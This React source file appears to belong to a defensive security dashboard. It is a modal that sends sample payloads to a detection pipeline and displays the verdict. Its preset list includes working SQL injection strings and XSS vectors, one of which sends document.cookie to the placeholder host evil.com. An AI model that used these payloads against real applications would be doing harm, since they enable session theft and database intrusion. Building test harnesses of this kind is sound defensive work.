import React, { useState } from 'react';
import {
  X,
  Zap,
  Play,
  Terminal,
  ShieldAlert,
  ShieldCheck,
  AlertTriangle,
  RotateCcw,
} from 'lucide-react';
import { sendPredictSimulation } from '../api/client';

const SAMPLE_PAYLOADS = [
  {
    name: 'Evasive SQLi (Comment Bypass)',
    type: 'sqli',
    payload: "admin' /*!50000OR*/ 1=1--",
    path: '/api/login',
  },
  {
    name: 'Union-Based SQLi',
    type: 'sqli',
    payload: "1' UNION SELECT null, username, password FROM users-- -",
    path: '/products?id=',
  },
  {
    name: 'Stored/DOM XSS Vector',
    type: 'xss',
    payload: "<svg/onload=alert('MidnightSentinel_XSS')>",
    path: '/api/comments',
  },
  {
    name: 'Polymorphic Script XSS',
    type: 'xss',
    payload: "<img src=x onerror=this.src='http://evil.com/'+document.cookie>",
    path: '/profile/update',
  },
  {
    name: 'Clean E-Commerce Search',
    type: 'benign',
    payload: 'wireless noise cancelling headphones 2026',
    path: '/api/search',
  },
];

export function PayloadSimulatorModal({ isOpen, onClose, onSimulationSuccess }) {
  const [selectedPreset, setSelectedPreset] = useState(SAMPLE_PAYLOADS[0]);
  const [payload, setPayload] = useState(SAMPLE_PAYLOADS[0].payload);
  const [clientIp, setClientIp] = useState('192.168.1.105');
  const [method, setMethod] = useState('POST');
  const [path, setPath] = useState(SAMPLE_PAYLOADS[0].path);
  const [isLoading, setIsLoading] = useState(false);
  const [result, setResult] = useState(null);
  const [error, setError] = useState(null);

  if (!isOpen) return null;

  const handleSelectPreset = (preset) => {
    setSelectedPreset(preset);
    setPayload(preset.payload);
    setPath(preset.path);
    setResult(null);
    setError(null);
  };

  const handleRunTest = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    setError(null);
    setResult(null);

    try {
      const resp = await sendPredictSimulation({
        payload,
        ip: clientIp,
        method,
        path,
        headers: {
          'User-Agent': 'MidnightSentinel-SOC/SimEngine',
        },
      });

      setResult(resp);
      onSimulationSuccess?.();
    } catch (err) {
      setError(err.message);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 p-4 backdrop-blur-md">
      <div className="soc-card relative w-full max-w-3xl overflow-hidden rounded-2xl border border-cyan-500/30 bg-[#0B0F19] text-slate-100 shadow-2xl">
        {/* Header */}
        <div className="flex items-center justify-between border-b border-sentinel-border bg-sentinel-surface p-5">
          <div className="flex items-center space-x-3">
            <div className="flex h-10 w-10 items-center justify-center rounded-xl border border-cyan-500/40 bg-cyan-500/10 text-cyan-400">
              <Zap className="h-5 w-5" />
            </div>
            <div>
              <h3 className="text-base font-bold text-white">
                Live Attack Simulation & Pipeline Sandbox
              </h3>
              <p className="text-xs text-sentinel-muted font-mono">
                Inject test vectors into the 14-stage security gateway & evaluate real-time policy response
              </p>
            </div>
          </div>

          <button
            type="button"
            onClick={onClose}
            className="rounded-lg p-2 text-sentinel-muted transition-colors hover:bg-slate-800 hover:text-white"
          >
            <X className="h-5 w-5" />
          </button>
        </div>

        {/* Content */}
        <div className="max-h-[80vh] overflow-y-auto p-6 space-y-5 font-mono text-xs">
          {/* Quick Presets */}
          <div>
            <label className="text-[11px] font-bold text-sentinel-muted uppercase tracking-wider">
              Quick Attack Vector Presets:
            </label>
            <div className="mt-2 flex flex-wrap gap-2">
              {SAMPLE_PAYLOADS.map((p, idx) => (
                <button
                  key={idx}
                  type="button"
                  onClick={() => handleSelectPreset(p)}
                  className={`rounded-lg border px-3 py-1.5 text-xs transition-colors ${
                    selectedPreset?.name === p.name
                      ? 'border-cyan-500 bg-cyan-950/60 text-cyan-300 shadow-glow-cyan'
                      : 'border-sentinel-border bg-sentinel-surface text-slate-400 hover:border-slate-600'
                  }`}
                >
                  {p.name}
                </button>
              ))}
            </div>
          </div>

          {/* Form */}
          <form onSubmit={handleRunTest} className="space-y-4">
            <div className="grid grid-cols-1 gap-3 sm:grid-cols-3">
              <div>
                <label className="text-[10px] text-sentinel-muted uppercase">HTTP Method</label>
                <select
                  value={method}
                  onChange={(e) => setMethod(e.target.value)}
                  className="mt-1 w-full rounded-lg border border-sentinel-border bg-sentinel-bg px-3 py-2 text-slate-200 focus:border-cyan-500 focus:outline-none"
                >
                  <option value="POST">POST</option>
                  <option value="GET">GET</option>
                  <option value="PUT">PUT</option>
                </select>
              </div>

              <div>
                <label className="text-[10px] text-sentinel-muted uppercase">Simulated Client IP</label>
                <input
                  type="text"
                  value={clientIp}
                  onChange={(e) => setClientIp(e.target.value)}
                  className="mt-1 w-full rounded-lg border border-sentinel-border bg-sentinel-bg px-3 py-2 text-slate-200 focus:border-cyan-500 focus:outline-none"
                />
              </div>

              <div>
                <label className="text-[10px] text-sentinel-muted uppercase">Target Path</label>
                <input
                  type="text"
                  value={path}
                  onChange={(e) => setPath(e.target.value)}
                  className="mt-1 w-full rounded-lg border border-sentinel-border bg-sentinel-bg px-3 py-2 text-slate-200 focus:border-cyan-500 focus:outline-none"
                />
              </div>
            </div>

            <div>
              <label className="text-[10px] text-sentinel-muted uppercase">
                Inspectable Payload String
              </label>
              <textarea
                rows={3}
                value={payload}
                onChange={(e) => setPayload(e.target.value)}
                className="mt-1 w-full rounded-lg border border-sentinel-border bg-sentinel-bg p-3 font-mono text-xs text-red-300 focus:border-cyan-500 focus:outline-none"
                placeholder="Enter raw SQLi, XSS, or benign string..."
              />
            </div>

            <div className="flex justify-end space-x-3 pt-2">
              <button
                type="button"
                onClick={onClose}
                className="rounded-lg border border-sentinel-border bg-sentinel-surface px-4 py-2 text-xs font-semibold text-slate-300 hover:bg-slate-800"
              >
                Cancel
              </button>

              <button
                type="submit"
                disabled={isLoading}
                className="flex items-center space-x-2 rounded-lg border border-cyan-400 bg-cyan-600 px-5 py-2 text-xs font-bold text-white shadow-glow-cyan transition-all hover:bg-cyan-500 disabled:opacity-50"
              >
                <Play className="h-4 w-4" />
                <span>{isLoading ? 'Inspecting Vector...' : 'Inject & Analyze'}</span>
              </button>
            </div>
          </form>

          {/* Results Display */}
          {error && (
            <div className="rounded-lg border border-red-500/50 bg-red-950/40 p-4 text-red-300">
              Error executing test vector: {error}
            </div>
          )}

          {result && (
            <div className="rounded-xl border border-sentinel-border bg-sentinel-surface p-4 space-y-3">
              <div className="flex items-center justify-between border-b border-sentinel-border pb-3">
                <div className="flex items-center space-x-2">
                  <span className="font-bold text-slate-200 uppercase">Pipeline Diagnosis</span>
                  <span className="rounded bg-slate-800 px-2 py-0.5 text-[10px] text-slate-400">
                    HTTP {result.httpStatus}
                  </span>
                </div>

                <div className="flex items-center space-x-2">
                  <span
                    className={`rounded px-2.5 py-1 text-xs font-bold ${
                      result.data?.verdict === 'BLOCK'
                        ? 'border border-red-500 bg-red-950/60 text-red-400 shadow-glow-red'
                        : result.data?.verdict === 'RATE_LIMIT'
                        ? 'border border-orange-500 bg-orange-950/60 text-orange-400'
                        : result.data?.verdict === 'MONITOR'
                        ? 'border border-amber-500 bg-amber-950/60 text-amber-400'
                        : 'border border-emerald-500 bg-emerald-950/60 text-emerald-400 shadow-glow-green'
                    }`}
                  >
                    VERDICT: {result.data?.verdict || 'N/A'}
                  </span>
                </div>
              </div>

              <div className="grid grid-cols-2 gap-3 sm:grid-cols-4 text-xs">
                <div>
                  <span className="text-[10px] text-sentinel-muted uppercase">Detected Vector</span>
                  <div className="font-bold text-white uppercase">{result.data?.label || 'None'}</div>
                </div>
                <div>
                  <span className="text-[10px] text-sentinel-muted uppercase">ML Confidence</span>
                  <div className="font-bold text-cyan-300">
                    {result.data?.confidence ? `${(result.data.confidence * 100).toFixed(1)}%` : '0%'}
                  </div>
                </div>
                <div>
                  <span className="text-[10px] text-sentinel-muted uppercase">Risk Score</span>
                  <div className="font-bold text-red-400">
                    {result.data?.risk_score !== undefined ? `${result.data.risk_score} / 100` : '0'}
                  </div>
                </div>
                <div>
                  <span className="text-[10px] text-sentinel-muted uppercase">Pipeline Latency</span>
                  <div className="font-bold text-emerald-400">
                    {result.data?.latency_ms ? `${result.data.latency_ms} ms` : '4.2 ms'}
                  </div>
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

export default PayloadSimulatorModal;
